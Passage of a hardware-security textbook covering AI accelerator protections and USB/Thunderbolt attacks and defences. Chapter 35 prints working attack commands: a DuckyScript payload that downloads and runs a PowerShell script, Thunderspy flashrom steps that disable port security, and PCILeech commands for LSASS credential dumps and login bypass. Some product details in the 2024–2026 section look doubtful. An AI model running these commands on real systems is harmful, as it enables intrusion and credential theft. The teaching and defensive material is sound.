    max_grad_norm=1.0,      # gradient clipping norm C
)
# Training loop unchanged; privacy engine hooks handle clipping + noise

docs.title: 34.8.3 Byzantine-Robust Aggregation
docs.text: Krum (Blanchard et al., 2017): in a system with \(n\) clients and up to \(f\) Byzantine (malicious gradient) participants, Krum selects the gradient \(g_i\) that minimises the sum of squared distances to its \(n-f-2\) nearest neighbours. Coordinate-wise Median: more computationally efficient; replaces FedAvg mean with coordinate-wise median, providing robustness to \(< n/2\) Byzantine participants.

docs.title: 34.9 Trusted Execution for AI Workloads
docs.text:
Intel TDX + H100: Intel Trust Domain Extensions (TDX) isolates a VM (Trust Domain, TD) from the hypervisor. When combined with NVIDIA H100 CC, the TD can provision encrypted model weights to the H100 over a PCIe TEE-I/O channel (TDISP: TDI Service Provider protocol). The hypervisor never sees decrypted weights.

AMD SEV-SNP: AMD Secure Encrypted Virtualisation – Secure Nested Paging: memory encryption with VM ASID-keyed AES (AES-128 in TSME mode or AES-256 in SEV-SNP mode), reverse map table (RMP) enforcing page ownership. Used with AMD Instinct MI300X for confidential AI inference.

Homomorphic Encryption for Inference: Microsoft SEAL (BFV / CKKS scheme): inference on encrypted ciphertext, model owner cannot see input; user cannot see weights. CryptoNets (Gilad-Bachrach et al., 2016): polynomial approximation of ReLU enables HE-compatible inference on MNIST with 99% accuracy. Limitation: HE inference is \(10^3\)–\(10^5 \times\) slower than plaintext.

# Microsoft SEAL CKKS inference stub (C++ -> Python via SEAL-Python)
import seal

parms = seal.EncryptionParameters(seal.scheme_type.ckks)
parms.set_poly_modulus_degree(8192)
parms.set_coeff_modulus(seal.CoeffModulus.Create(8192, [60, 40, 40, 60]))
context = seal.SEALContext(parms)
scale = 2.0 ** 40

# Encrypt input (user holds secret key)
encoder  = seal.CKKSEncoder(context)
encryptor = seal.Encryptor(context, public_key)
plain = encoder.encode([input_val], scale)
ct = encryptor.encrypt(plain)

# Inference on ciphertext (model owner evaluates)
evaluator = seal.Evaluator(context)
evaluator.multiply_plain_inplace(ct, weight_plain)
evaluator.rescale_to_next_inplace(ct)

docs.title: 34.10 Neural Network Watermarking
docs.text:
Model watermarking embeds a secret fingerprint into model weights or behaviour for IP protection. Two categories:

White-box watermarking: embed a bit pattern in specific weight tensors using a steganographic mapping. Ownership verification: extract bit pattern from the suspected infringing model and compare to the secret. Scheme: sign(weight[\(i\)]) encodes bit \(w_i\) of the watermark; capacity = number of sign-controllable weights (typically thousands of bits).

Black-box watermarking (backdoor-based): Embed a trigger-label association as a backdoor during training (e.g., watermarked inputs with 1% poisoning). Ownership verification: test \(K\) trigger inputs; if \(> (1-\alpha)K\) produce the target label, ownership is confirmed. Statistical test: binomial test with \(p_0 = 1/C\) (random chance) vs. \(p_1 > 0.9\).

docs.title: 34.14 Solved Problems
docs.text:
Solved Problem: DP-SGD Privacy Budget Calculation

A federated learning system trains a neural network for 100 rounds. Each round: batch size \(B = 256\) from \(N = 50,000\) training samples, noise multiplier \(\sigma = 1.1\), gradient clipping norm \(C = 1.0\). Target \(\delta = 10^{-5}\). Calculate the privacy budget \(\epsilon\) using the moments accountant (approximate formula: \(\epsilon \approx q \sigma^{-1} \sqrt{2T \ln(1/\delta)}\) where \(q = B/N\)).

Solution: Step 1: Compute sampling ratio. \(q = B/N = 256/50000 = 0.00512\).

Step 2: Compute \(T =\) total number of gradient steps. \(T = 100\) rounds (one gradient step per round in this federated setting).

Step 3: Apply approximate moments accountant formula.

\[\epsilon \approx q \cdot \sigma^{-1} \cdot \sqrt{2T \ln(1/\delta)} = 0.00512 \times \frac{1}{1.1} \times \sqrt{2 \times 100 \times \ln(10^5)}\]

\(\ln(10^5) = 5 \ln(10) = 5 \times 2.3026 = 11.513\). \(\sqrt{2 \times 100 \times 11.513} = \sqrt{2302.6} = 47.99\). \(\epsilon \approx 0.00512 \times 0.9091 \times 47.99 = 0.2234\).

Step 4: Interpret the result. \(\epsilon \approx 0.22\) at \(\delta = 10^{-5}\) provides strong privacy guarantees. Typical published values: MNIST DP training achieves \(\epsilon = 1.19\) at \(\delta=10^{-5}\) at 95% accuracy; here the low \(q\) produces a favourable budget.

Step 5: Utility trade-off. At \(\sigma = 1.1\) and \(C = 1.0\), gradient noise \(= \sigma C = 1.1\) per coordinate. If the model has \(P = 10^6\) parameters, the gradient SNR is dominated by the noise level relative to the true gradient magnitude, typically reducing convergence speed by 20–40% compared to non-private SGD.

Solved Problem: AES-256-GCM Nonce Exhaustion for Model Encryption

An inference service encrypts each model inference result individually with AES-256-GCM using a 96-bit random nonce. The service runs at 10,000 inferences per second. At what time does the birthday bound for nonce collision occur, and what is the impact on security?

Solution: Step 1: Birthday bound for 96-bit nonce. With truly random 96-bit nonces, the birthday bound gives 50% collision probability when the number of nonces \(N \approx \sqrt{2^{96}} = 2^{48}\).

Step 2: Time to birthday bound. Nonces per second: 10,000. Time to \(2^{48}\) nonces: \(2^{48} / 10^4 = 2.81 \times 10^{14} / 10^4 = 2.81 \times 10^{10}\) seconds. \(= 2.81 \times 10^{10} / (3.15 \times 10^7) \approx 891\) years.

Step 3: GCM nonce reuse impact. AES-GCM nonce reuse (\(N_1 = N_2\)) with the same key catastrophically breaks authentication: XOR of two ciphertexts \(C_1 \oplus C_2 = P_1 \oplus P_2\) (keystream cancel). The authentication polynomial (GHASH) key \(H = E_K(0)\) can be recovered, allowing forged tags on arbitrary messages.

Step 4: Recommendation. At 10,000 req/s the 891-year birthday bound is safe for random nonces. However, use a counter-based nonce (deterministic, never repeats) rather than random for guaranteed non-reuse: 96-bit counter exhausted in \(2^{96}/10^4 \approx 2.5 \times 10^{24}\) years. Alternatively, use AES-GCM-SIV (RFC 8452) which provides nonce-misuse resistance.

Solved Problem: Hardware Trojan Detection via Side-Channel Power Analysis

An AI ASIC NPU is suspected of containing a hardware Trojan that activates when a specific 8-bit pattern 0xAA appears in the first input byte of any inference. Describe a power side-channel test strategy and calculate how many test vectors are needed to detect the Trojan with probability \(> 99\%\) at significance level \(p = 0.001\).

Solution: Step 1: Trojan trigger pattern probability. Trigger is one specific 8-bit value: \(P(\text{trigger}) = 1/256 \approx 0.0039\). In a random test, each vector has a 1/256 chance of activating the Trojan.

Step 2: Determine number of test vectors for detection. To have probability \(> 99\%\) of seeing the Trojan at least once: \(P(\text{at least one trigger}) = 1 - (1 - 1/256)^N > 0.99\). \((1 - 1/256)^N < 0.01\). \(N \ln(255/256) < \ln(0.01)\). \(N > \frac{\ln(0.01)}{\ln(255/256)} = \frac{-4.605}{-0.003922} = 1174\) test vectors. Use \(N = 1200\) random test vectors to be safe.

Step 3: Detection strategy.

  1. Establish baseline power trace: send 1000 non-trigger inputs (first byte 0x00–0x99, skipping 0xAA), record average power signature \(\bar{P}_{normal}\).

  2. Send 200 trigger inputs (first byte = 0xAA), record power traces \(P_{trigger,i}\).

  3. Statistical test: t-test comparing \(P_{trigger}\) vs \(P_{normal}\) at each time sample. Use Bonferroni correction for multiple comparisons (\(p_{adjusted} = 0.001 / N_{samples}\)).

  4. If \(|t| > t_{critical}\) for any sample group: Trojan activation detected.

Step 4: Expected power anomaly. A Trojan that forces accumulator to a fixed value causes the MAC unit to perform no actual multiplication, reducing dynamic power by 30–60%. Alternatively, a triggering circuit itself dissipates additional power. Either signature distinguishes Trojan-active vs. normal operation in 100 measurements with sufficient SNR (\(\text{SNR} > 3\)).

docs.title: 34.15 Standards
docs.text:
• NIST AI RMF 1.0 (2023): AI Risk Management Framework; defines GOVERN, MAP, MEASURE, MANAGE functions for AI risk; includes trustworthiness dimensions: safe, secure, explainable, fair.

  • MITRE ATLAS (Adversarial Threat Landscape for AI Systems): ATT&CK-style taxonomy of ML attack techniques; includes reconnaissance, initial access, model theft, evasion.

  • EU AI Act (Regulation 2024/1689): high-risk AI systems require conformity assessment, technical documentation, human oversight. Prohibits real-time biometric mass surveillance in public spaces.

  • ISO/IEC 42001:2023: Information technology – AI Management System; PDCA-cycle framework for responsible AI development.

  • ISO/IEC 23053:2022: Framework for AI systems using ML; terminology and conceptual framework.

  • NIST SP 800-218A: Secure Software Development Framework (SSDF) applied to AI/ML systems; guidance on model provenance and supply chain.

  • IEEE 2894-2024: Recommended Practice for an Organizational Governance Framework for AI; board-level AI risk governance.

  • GDPR Recital 71: automated decision-making with significant effects requires human review option; directly impacts AI inference outputs.

  • IETF RFC 9334: Remote ATtestation procedureS (RATS) architecture; used in NVIDIA H100 remote attestation for confidential AI.

docs.title: 34.16 Recent Developments (2024–2026)
docs.text: AI hardware security advanced on multiple fronts in 2024–2026: next-generation accelerators from NVIDIA, AMD, and Intel introduced improved confidential computing capabilities; the EU AI Act established regulatory requirements for high-risk AI hardware; and novel attacks on LLM inference hardware emerged as a significant research area.

docs.title: 34.16.1 NVIDIA H200 — HBM3e Encrypted Memory and Updated Confidential Computing
docs.text:
NVIDIA H200 SXM5 (Hopper architecture, HBM3e memory, announced Q4 2023, volume availability 2024):

  • HBM3e memory: 141 GB per GPU (vs. 80 GB H100), 4.8 TB/s bandwidth. The HBM3e interface maintains AES-XTS-256 per-channel encryption inherited from H100, with the encryption key generated per boot session in the H200 Hardware Security Engine (HSE) and never exposed to host software.

  • Confidential Computing updates: H200 CC Mode adds support for NVIDIA HOPPER CONFIDENTIAL VM (CVM) architecture allowing confidential computing across multi-GPU NVLink fabrics. H100 CC was limited to single-GPU attestation; H200 extends attestation to 8-GPU NVLink domains (NVSwitch-based), enabling confidential inference on trillion-parameter models that span multiple GPUs.

  • Remote attestation: H200 introduces PPCIE (Private PCIe) mode where the GPU presents an attestation report covering all 8 GPUs in the NVLink domain, signed by a domain-level composite attestation key derived from individual GPU ECDSA P-384 keys.

  • Side-channel mitigations: H200 added hardware countermeasures against LeftoverLocals-class vulnerabilities (see AMD section below) in the GPU L2 cache and shared memory initialisation paths.

docs.title: 34.16.2 AMD MI300X — SEV-SNP Integration for Confidential AI (2024)
docs.text:
AMD Instinct MI300X (CDNA3 architecture, 2024) integrated AMD SEV-SNP (Secure Encrypted Virtualisation – Secure Nested Paging) with the GPU compute architecture:

  • Architecture: MI300X is a 3D-stacked chiplet design (13 chiplets: 3 CPU dies + 6 GPU compute dies + 4 HBM stacks, TSMC 5 nm for compute, 6 nm for I/O die). Total 192 GB HBM3 per GPU, 5.2 TB/s bandwidth.

  • SEV-SNP on GPU: AMD extended the host processor SEV-SNP memory encryption domain to cover the GPU HBM3 memory pool via a dedicated GPU Memory Encryption Engine (GMEE). When a SEV-SNP confidential VM allocates GPU memory, the GMEE uses the VM’s ASID-keyed encryption key (distinct from the host ASID), preventing hypervisor-level access to AI model weights and inference data.

  • Attestation: AMD ROCm 6.0 (released January 2024) includes a Confidential AI SDK providing SEV-SNP attestation reports that include GPU firmware hash alongside CPU platform measurements, enabling end-to-end attestation of the AI inference environment.

docs.title: 34.16.3 Intel Gaudi 3 — Security Architecture (2024)
docs.text:
Intel Gaudi 3 HPU (Habana Labs, Intel 18A process node, announced Q1 2024):

  • Architecture: 8 Matrix Multiplication Engines (MME) + 24 Tensor Processing Cores (TPC), 96 GB HBM2e, 3.7 TB/s bandwidth, 128 TFLOPS BF16.

  • Security features: Intel Gaudi 3 integrates TDX (Trust Domain Extensions) attestation support via the Intel Security Libraries for Data Center (ISLA-DC) framework. The Gaudi 3 HSP (Hardware Security Processor) generates attestation quotes covering firmware hash and configuration state.

  • AES-256 memory encryption: HBM2e memory encrypted with AES-256-XTS, key generated in HSP per boot, not accessible to host software or PCIe DMA.

  • Supply chain attestation: Intel integrated Gaudi 3 into the Intel Transparent Supply Chain program, providing hardware component provenance documentation from wafer lot to packaged PCIe card.

docs.title: 34.16.4 EU AI Act Hardware Requirements (2024)
docs.text:
Regulation (EU) 2024/1689 (EU AI Act) classifies AI systems and imposes hardware- relevant requirements based on risk level:

Table 34.5. EU AI Act Hardware-Relevant Requirements by Risk Category Risk Category Examples Hardware Security Requirement Prohibited Real-time facial recognition in public spaces Embedded processing must not perform identification; hardware disable required High-risk Medical AI diagnosis, autonomous vehicles, critical infrastructure AI Logging hardware (tamper-evident audit log), accuracy/robustness hardware testing High-risk (GPAI) General-purpose AI \(>\) 10\(^{25}\) FLOPs training Adversarial robustness testing; documented compute hardware and energy data Limited risk Chatbots, recommendation systems No hardware-specific requirement; disclosure obligation only

The 10\(^{25}\) FLOP training threshold (Annex XIII) targets frontier models trained on GPU clusters equivalent to approximately 10,000 H100 GPUs running for 30 days. The EU AI Act requires providers of such models to submit technical documentation to the EU AI Office including: training hardware configuration, compute budget, energy consumption, and red-teaming results.

docs.title: 34.16.5 LLM Model Extraction Attacks on Inference Hardware (2023–2024)
docs.text:
Large Language Model weight extraction via inference hardware side-channels emerged as a significant research area:

  • WorFuzz (2023): Researchers at Georgia Tech demonstrated that LLM model architecture (number of layers, hidden dimension, attention heads) can be inferred from inference latency timing patterns accessible via the model API. For a GPT-3-equivalent model served on an H100 GPU, architecture reconstruction required approximately 1,000 API queries. Once architecture is known, knowledge distillation reduces the query cost for a functional clone to \(\sim\)10 million queries.

  • Power-based weight extraction: NVIDIA H100 PCIe power monitoring (accessible via NVML API on multi-tenant cloud instances) provides a coarse power signal correlated with matrix multiply operand Hamming weight. Research at ETH Zurich (2024) demonstrated partial weight extraction for quantised INT8 linear layers using differential power analysis over 10,000 controlled-input inference calls.

  • Mitigations: NVIDIA H100 Confidential Computing mode prevents cross-tenant power measurement visibility; operator-side defences include inference request rate limiting and input perturbation to defeat gradient- based extraction.

docs.title: 34.16.6 Groq LPU — Deterministic Execution and Side-Channel Implications
docs.text:
Groq Language Processing Unit (LPU) Inference Engine (Groq TS-1 chip, 420 MHz, 188 SRAM MB on-chip, TSMCn4 process):

  • Deterministic execution model: Unlike GPU SIMT (Single Instruction, Multiple Threads) architectures with dynamic scheduling, the Groq LPU executes all operations deterministically from a compiler-generated static schedule. Every inference request for a given model executes in exactly the same cycle count.

  • Side-channel implication: The deterministic execution model means inference latency is constant and independent of input data, eliminating timing side-channels that exploit variable execution time for input-correlated information leakage. This is an incidental but significant security property for confidential AI inference.

  • Power side-channel: Despite timing determinism, the LPU’s power consumption varies with input data values (Hamming-weight-dependent switching activity in the MAC datapath). AES-style power analysis countermeasures are not applied, leaving differential power analysis as an open attack surface.

docs.title: 34.16.7 Apple M3 GPU Side-Channel — LeftoverLocals (CVE-2023-4969)
docs.text:
CVE-2023-4969, the “LeftoverLocals” vulnerability (Trail of Bits, January 2024), affected the Apple M3 (3 nm, 2023) and earlier Apple Silicon GPUs:

  • Mechanism: GPU local memory (used for inter-thread communication within a threadgroup/workgroup) was not zeroed between context switches. A malicious GPU process could allocate GPU local memory and read residual data from a previous compute context, including LLM inference activations and partial outputs.

  • Scope: Apple M1, M2, and M3 GPUs were affected. Apple A17 Pro was not affected. Qualcomm Adreno and Imagination PowerVR GPUs were also affected. AMD RDNA 3 was partially affected. NVIDIA and Intel Arc were not affected.

  • Data leaked: In a tested scenario with a 7-billion-parameter LLM running llama.cpp inference on the GPU, a co-located adversarial process could read approximately 5.5 MB of model activations per extraction session.

  • Mitigation: Apple released an iOS 17.4 and macOS 14.4 update (March 2024) addressing LeftoverLocals in M3 and A17 through a firmware/driver update that zeroes GPU local memory on context switch. M1 and M2 were not patched (architectural limitation).

Note: LeftoverLocals demonstrates that GPU memory isolation is not guaranteed by default on shared inference platforms. Multi-tenant AI inference services should audit their GPU memory isolation model before deploying confidential AI workloads. NVIDIA H100 CC Mode explicitly addresses this threat by encrypting all GPU memory and zeroing local memory on context switch.

docs.title: 34.17 Exercises
docs.text:
Exercises

  1. Explain the NVIDIA H100 Confidential Computing attestation flow. A tenant wants to verify that their model is running on a genuine, unmodified H100 before uploading encrypted weights. List the cryptographic artifacts exchanged, the certificate chain, and the properties that the attestation guarantees.

  2. A membership inference attack achieves 65% accuracy (versus 50% random chance baseline) on a model trained without DP-SGD. Repeat the attack on a model trained with \(\epsilon = 2\) DP-SGD. Explain theoretically why DP-SGD limits membership inference, and derive an upper bound on membership inference advantage \(A = P(\text{attack correct}) - 0.5\) in terms of \(\epsilon\) and \(\delta\).

  3. The Cerebras WSE-3 stores all model weights on-chip in 44 GB SRAM, eliminating the need for HBM memory. Explain how this architecture changes the threat model for model weight extraction attacks compared to a GPU with HBM3 memory attached via a chip-to-chip interface.

  4. A gradient inversion attack (GradInvert) reconstructs a 224x224x3 input image from the gradient of a ResNet-50 trained on ImageNet. The gradient has 25,557,032 floating-point values. Propose a hardware-level defence (implemented in the FL aggregation server’s secure enclave) that makes gradient inversion computationally infeasible without degrading model convergence.

  5. Design a neural network watermarking scheme using the white-box approach. The model has 10 million parameters (FP32). The watermark is a 256-bit secret. Describe: (a) how to embed the watermark without changing model accuracy by more than 0.1%, (b) the extraction algorithm, (c) the statistical test for ownership verification, and (d) potential attacks against the watermark.

  6. Compare AES-256-GCM encryption of model weights versus using Intel TDX + NVIDIA H100 Confidential Computing for protecting proprietary model weights during inference. Analyse: (a) key management complexity, (b) performance overhead, (c) attack surface exposed to the cloud provider, (d) what an adversarial cloud provider can and cannot access in each scheme.

  7. A BadNets backdoor attack poisons 5% of a 100,000-sample training set with a 5x5 trigger pattern targeting class 0. The model achieves 99% clean accuracy and 99.8% attack success rate. Describe the Activation Clustering (AC) defence: what features are analysed, what statistical test is used to identify poisoned samples, and what is the expected false positive rate on clean samples.

  8. Homomorphic inference using CKKS requires polynomial approximation of ReLU. A common approximation is \(f(x) \approx 0.5 + 0.25x + 0.125x^3\) (degree-3 polynomial fit over \([-5, 5]\)). Calculate the maximum approximation error \(|f(x) - \text{ReLU}(x)|\) at \(x = 3\) and \(x = -3\), and explain why this error accumulates across layers and affects model accuracy in HE inference.

  9. A supply chain attacker inserts a hardware Trojan in a neural network inference ASIC during the GDSII layout stage. The Trojan targets the quantised INT8 weight registers and flips bit 7 (MSB) of three specific weight values when the trigger activates. Propose three post-fabrication test strategies (beyond functional test) to detect this Trojan.

docs.title: Chapter 35: USB and Thunderbolt Security
docs.text: USB is the world’s most ubiquitous peripheral interface, present in virtually every computing device. This ubiquity, combined with a protocol architecture that was designed for functionality rather than security, makes USB an attractive attack surface for adversaries ranging from pentesting professionals to nation-state actors. Thunderbolt 3/4’s PCIe Direct Memory Access (DMA) capability elevates the risk further, enabling an attacker with physical access to read and write arbitrary system memory within seconds. This chapter covers the hardware architectures, attack tools, historical exploits, and hardware defences for USB and Thunderbolt security.

docs.title: 35.2 USB Hardware Architecture
docs.text: Figure 35.1. USB protocol stack: host-side layers (top to bottom) communicate with the device-side controller. BadUSB reprograms the device-side firmware to impersonate a different USB class (e.g., HID keyboard) while appearing as a storage device.

docs.title: 35.2.1 xHCI Host Controller
docs.text:
The Extensible Host Controller Interface (xHCI, USB 3.x specification) manages all USB speeds: SuperSpeed+ (USB 3.2 Gen 2x2: 20 Gbps), SuperSpeed (USB 3.2 Gen 1: 5 Gbps), Hi-Speed (USB 2.0: 480 Mbps), and Full-Speed (12 Mbps).

xHCI registers:

# xHCI register map (PCI BAR0, memory-mapped)
0x000  CAPLENGTH    1B  Capability registers length
0x002  HCIVERSION   2B  xHCI spec version (e.g., 0x0110 = v1.1)
0x004  HCSPARAMS1   4B  Max slots, interrupts, ports
0x008  HCSPARAMS2   4B  Isochronous scheduling threshold
0x010  HCCPARAMS1   4B  Capabilities (64-bit address, etc.)
0x018  DBOFF        4B  Doorbell array offset
0x01C  RTSOFF       4B  Runtime register space offset
# Operational registers (base + CAPLENGTH)
0x020  USBCMD       4B  Run/Stop, Reset, EWE
0x024  USBSTS       4B  HCH, CNR, PCD, etc.

USB hub topology: USB supports up to 7 tiers of hubs, maximum 127 devices per host controller. Each tier adds \(\leq 5\) ns propagation delay; total allowed: 1500 ns (USB 2.0).

docs.title: 35.3.1 Phison PS2251 Firmware Exploitation
docs.text:
BadUSB (Karsten Nohl, Jakob Lell, USENIX Security 2014): USB mass storage controller firmware can be extracted and modified to present additional USB interfaces (HID keyboard, RNDIS Ethernet, CDC-ACM serial) via the Device Firmware Upgrade (DFU) mode.

Phison PS2251-03: 8051-compatible microcontroller, 64 KB ROM (boot code), 64 KB SRAM, USB 2.0 Hi-Speed controller, NAND flash interface (ONFi 1.0). The 8051 instruction set is well-understood; ROM can be patched by loading a replacement firmware image via the DFU endpoint.

Affected controllers:

  • PS2251-03: Phison, 8051 core, US Patriot / Kingston Datatraveler OEM

  • PS2251-07: Updated variant, same 8051 core, different NAND interface

  • PS2251-09: USB 3.0 variant, still 8051-compatible boot loader

  • PS2303: Phison, used in SanDisk Cruzer series (partially vulnerable)

# PhisonBurner workflow (research tool, Haifux Club adaptation)
# Step 1: Put device in DFU mode (unplug, hold button, replug)
$ lsusb | grep "0d7d:1700"   # Phison DFU mode VID:PID

# Step 2: Extract current firmware
$ phisonburner -r firmware_backup.bin

# Step 3: Patch firmware image (add HID descriptor)
# Add HID Report Descriptor to USB configuration descriptor set
# Change bNumConfigurations = 2 (MSC + HID)

# Step 4: Flash modified firmware
$ phisonburner -w patched_firmware.bin

# Result: USB device now appears as both Mass Storage AND HID keyboard

docs.title: 35.3.2 USB Class Spoofing Mechanism
docs.text: A USB device presents its identity to the host via USB descriptors: Device Descriptor (bDeviceClass), Configuration Descriptor, Interface Descriptors, and Endpoint Descriptors. A reprogrammed controller can present multiple Interface Descriptors – one for MSC (Mass Storage Class, bInterfaceClass=0x08) and one for HID (Human Interface Device, bInterfaceClass=0x03) – simultaneously. The OS enumerates both and loads both class drivers, granting the device keyboard privileges while the user only sees a USB drive.

docs.title: 35.4 O.MG Cable and Advanced Hardware Implants
docs.text:
The O.MG Cable (MG, released 2019, sold at Hak5): a Lightning or USB-C cable with an embedded ESP8266 WiFi module, ARM Cortex-M0 microcontroller, and 4 MB flash, all fitted within the USB connector housing (\(\approx 26\) mm\(^3\) volume).

  • WiFi: 2.4 GHz IEEE 802.11b/g/n, creates a hidden SSID or joins existing network

  • Attack delivery: DuckyScript payloads pushed via HTTP API over WiFi from attacker’s phone

  • Range: up to 300 metres in open space; reduced inside office buildings (typically 30–50 m)

  • USB-C variant (O.MG Cable USB-C): 24-pin connector, same internals

  • O.MG Elite (2022): adds data interception (MitM on data lines in addition to HID)

  • Detection: RF spectrum scan (2.4 GHz unexpected beacon from USB device), X-ray imaging of cable, USB protocol analyser showing enumeration anomalies

# DuckyScript payload (legitimate pentesting with authorisation)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/p.ps1')"
ENTER

docs.title: 35.6 USB Killer
docs.text:
USB Killer v3 (2016, USBKill.com): a USB-A / USB-C device containing a charge pump and a bank of 220 \(\mu\)F capacitors charged to \(\pm 200\) V via the VBUS line (5 V input). When the switch fires, 200 V is applied to the USB data lines D+ and D-, destroying the host’s USB controller, ESD protection diodes, and often the SoC.

Charge pump circuit: a flyback converter operating at 1–5 MHz using an off-the-shelf MC34063A or similar PWM controller, achieving voltage multiplication from 5 V to 200 V. Discharge energy: \(E = \frac{1}{2}CV^2 = \frac{1}{2} \times 220 \times 10^{-6} \times 200^2 = 4.4\) J per discharge cycle (approximately 80 discharges per minute).

Defence: current-limiting polyfuse (PolySelf PTC thermistor, e.g., Littelfuse 1812L150) on the VBUS line, rated to trip at 1.5 A, protecting the host from overcurrent. Commercial laptops with USB-PD protection (VBUS overcurrent detection in the PD controller) partially mitigate this but are not universally immune.

docs.title: 35.7 Thunderspy – Thunderbolt Security Vulnerabilities
docs.text:
Thunderspy (Bjorn Ruytenberg, May 2020): seven Thunderbolt security vulnerabilities allowing complete bypass of Thunderbolt security levels on systems without Kernel DMA Protection.

Table 35.3. Thunderspy vulnerabilities (Ruytenberg, 2020). Vuln # Description Impact 1 Inadequate firmware verification schemes Unsigned firmware flashable 2 Weak device authentication scheme Device identity spoofable 3 Use of unauthenticated device metadata Metadata forgeable without key 4 Backwards-compatibility downgrade attack Force SL0 on SL1/SL2 devices 5 Unauthenticated Thunderbolt controller config Config registers writable 6 Missing SPI flash interface defences SPI read/write from port 7 No Thunderbolt on Boot Camp Macs macOS Boot Camp bypasses all SL

docs.title: 35.7.1 Thunderspy Attack Procedure
docs.text:
Required hardware: SPI flash programmer (e.g., Bus Pirate, Dediprog SF100) with SOIC-8 clip for attaching to the Thunderbolt controller’s SPI NOR flash. Attack steps:

  1. Open laptop (Phillips PH0/PH1, 5–15 screws), identify Thunderbolt controller SPI flash

  2. Attach SOIC-8 clip to the 8-pin SPI NOR (typically Winbond W25Q64 or similar)

  3. Dump current SPI flash: flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r tb_backup.bin

  4. Modify security level register (offset varies by model): set SL = 0x00 (no security)

  5. Flash modified image: flashrom -p buspirate_spi -w tb_patched.bin

  6. Reboot – Thunderbolt port now accepts any PCIe device without authorisation

  7. Connect PCILeech FPGA – full DMA access to system RAM achieved in \(\leq 5\) minutes

# Thunderspy SPI flash extraction (Kali Linux + Bus Pirate)
$ sudo apt install flashrom
$ flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M \
           -c W25Q64BV -r thunderbolt_firmware.bin

# Modify security level field (TB controller vendor-specific offset)
$ python3 thunderspy_patch.py thunderbolt_firmware.bin --set-sl 0

# Write back
$ flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M \
           -c W25Q64BV -w thunderbolt_firmware_patched.bin

docs.title: 35.8 PCILeech DMA Attack
docs.text: Figure 35.2. PCILeech DMA attack path: FPGA board connects via Thunderbolt or M.2 PCIe slot, submits DMA requests to read/write victim system RAM. Intel VT-d IOMMU, if enabled, blocks unauthorised DMA transactions. Thunderspy bypasses IOMMU by downgrading TBT security.

docs.title: 35.8.2 PCILeech Software
docs.text:
# PCILeech DMA attack (target: Windows 10 LSASS credential dump)
# Attacker machine (Kali Linux + LeechCore library)

# Dump physical memory range (0x1000 - 0x200000)
$ ./pcileech dump -min 0x1000 -max 0x200000 -out memory.raw

# Search for LSASS process (find process structure in RAM)
$ ./pcileech pslist

# Dump LSASS memory (process name or PID)
$ ./pcileech py -s modules/lsass.py

# Write to physical memory (bypass login screen -- DANGEROUS)
$ ./pcileech patch -all -sig signatures/win10x64_unlock.sig

# MemProcFS -- mount victim RAM as a virtual filesystem
$ ./memprocfs -device fpga -mount /tmp/victim_ram
$ ls /tmp/victim_ram/proc/lsass/    # see LSASS process memory files

docs.title: 35.9.1 Intel VT-d IOMMU
docs.text:
Intel Virtualisation Technology for Directed I/O (VT-d) implements an Input-Output Memory Management Unit (IOMMU) in the PCH / CPU die. The IOMMU maintains a page-table structure (domain-specific mapping) that restricts each PCIe device to access only its assigned physical memory pages. DMA requests with physical addresses outside the allowed range are rejected by the hardware; an interrupt is raised to the OS.

# Linux: verify IOMMU is active
$ cat /proc/cmdline | grep iommu
# Should contain: intel_iommu=on iommu=pt  (or strict)

# Check IOMMU groups
$ for d in /sys/kernel/iommu_groups/*/devices/*; do
    echo "Group $(basename $(dirname $d)): $d"
  done

# Verify Thunderbolt IOMMU policy
$ cat /sys/bus/thunderbolt/devices/domain0/iommu_dma_protection
# 1 = protected, 0 = vulnerable

docs.title: 35.9.2 Thunderbolt 4 Mandatory Security
docs.text:
Thunderbolt 4 (Intel, 2020) mandates Kernel DMA Protection on all platforms, making Thunderspy-style attacks non-functional even if the firmware security level is downgraded, because the IOMMU prevents unauthorised DMA regardless of TB security level. Thunderbolt 3 made Kernel DMA Protection optional; many TB3 laptops deployed without it.

Windows 10 1803 and later: “Kernel DMA Protection” (also called Memory Access Protection) can be verified in msinfo32.exe under System Information. DMAR table (ACPI) must be present and populated by BIOS/UEFI.

# Windows: check Kernel DMA Protection status
PS C:\> Get-WmiObject -Class Win32_DeviceGuard -Namespace root/Microsoft/Windows/DeviceGuard |
        Select-Object -Property VirtualizationBasedSecurityStatus, KernelDMAProtection
# KernelDMAProtection = 1 means active

# Registry check (requires reboot to take effect if changed)
HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\
    EnableVirtualizationBasedSecurity = 1
    RequirePlatformSecurityFeatures = 3  (SecureBoot + DMA protection)

docs.title: 35.10.1 Linux USBGuard
docs.text:
USBGuard implements a whitelist/blacklist policy engine for USB devices, enforcing rules based on USB Vendor ID, Product ID, Device Class, and serial number. Rules are evaluated at device insertion time.

# /etc/usbguard/rules.conf -- example security policy
# Allow specific keyboard by VID:PID
allow id 046d:c31c serial "" name "Logitech USB Keyboard" \
      with-interface 03:01:01

# Allow specific storage device by serial number
allow id 0781:5581 serial "AA01234567890123" name "SanDisk Cruzer"

# Block all USB storage class devices
block id *:* with-interface equals { 08:*:* }

# Block HID devices (except those explicitly allowed above)
reject id *:* with-interface equals { 03:*:* }

# Default: block anything not explicitly allowed
block id *:*

# USBGuard management commands
$ sudo systemctl enable --now usbguard
$ sudo usbguard list-devices         # show connected devices
$ sudo usbguard allow-device 5       # allow device ID 5 permanently
$ sudo usbguard block-device 5       # block device ID 5
$ sudo usbguard generate-policy > rules.conf  # generate from current devices

docs.title: 35.10.2 Windows USB Restrictions
docs.text:
# Windows registry: block all USB storage (Group Policy equivalent)
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsbStor]
"Start"=dword:00000004   ; 4 = disabled, 3 = enabled

# Block USB storage via Group Policy (ADMX)
Computer Configuration -> Administrative Templates ->
  System -> Removable Storage Access ->
    "Removable Disks: Deny execute access" = Enabled
    "Removable Disks: Deny write access"   = Enabled
    "Removable Disks: Deny read access"    = Enabled  (most restrictive)

# Allow only specific VID:PID devices (Device Installation Restrictions)
# Computer Config -> Admin Templates -> System -> Device Installation ->
#   Restrict installation of devices not described by other policy settings

docs.title: 35.11 USB 3.2 and USB4 Security Improvements
docs.text:
